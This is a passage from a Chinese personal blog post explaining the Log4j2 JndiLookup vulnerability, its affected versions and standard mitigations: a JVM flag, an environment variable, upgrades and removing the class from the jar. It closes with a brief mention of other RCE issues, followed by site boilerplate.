漏洞是因为Log4j2组件中 lookup功能的实现类 <span class="hljs-keyword">JndiLookup </span>的设计缺陷导致，这个类存在于log4j-core-xxx.<span class="hljs-keyword">jar中</span><br><span class="hljs-keyword"></span><br>受影响的版本：<br><span class="hljs-number">2</span>.<span class="hljs-number">0</span>-<span class="hljs-keyword">beta9 </span>&lt;= Apache Log4j &lt;= <span class="hljs-number">2</span>.<span class="hljs-number">15</span>.<span class="hljs-number">0</span>-rc1<br><br>修复：<br>设置<span class="hljs-keyword">jvm参数：-Dlog4j2.formatMsgNoLookups=true</span><br><span class="hljs-keyword"></span>设置系统环境变量：FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS=true<br>升级版本：官方，最新的版本仅支持<span class="hljs-keyword">java, </span>ldap, 和 ldaps，同时默认禁用<span class="hljs-keyword">JNDI等等功能去限制利用构造payload去触发漏洞。</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">Java </span><span class="hljs-number">8</span>及之后的版本升级到v2.<span class="hljs-number">16</span>.<span class="hljs-number">0</span>。<br><span class="hljs-keyword">Java </span><span class="hljs-number">7</span>升级到 v2.<span class="hljs-number">12</span>.<span class="hljs-number">2</span>。<br>其他版本，删除<span class="hljs-keyword">JndiLookup类：zip </span>-q -d log4j-core-*.<span class="hljs-keyword">jar </span><span class="hljs-keyword">org/apache/logging/log4j/core/lookup/JndiLookup.class</span><br><span class="hljs-keyword"></span>钉钉\向日葵 RCE漏洞。  最新 apache漏洞等<br><br>部分原因 请自行查找相关技术文章学习，此处不做说明<br></code></pre></td></tr></table></figure>
                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>小总结（二）</div>
      <div>http://example.com/2023/04/20/小总结（二）/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>H0ne</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年4月20日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/04/20/%E5%B0%8F%E6%80%BB%E7%BB%93/" title="小总结">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">小总结</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/04/20/%E6%88%91%E4%B8%8D%E7%88%B1%E7%AF%AE%E7%90%83/" title="我不爱篮球-基尼太没">
                        <span class="hidden-mobile">我不爱篮球-基尼太没</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>




  
<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/snowflake.min.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
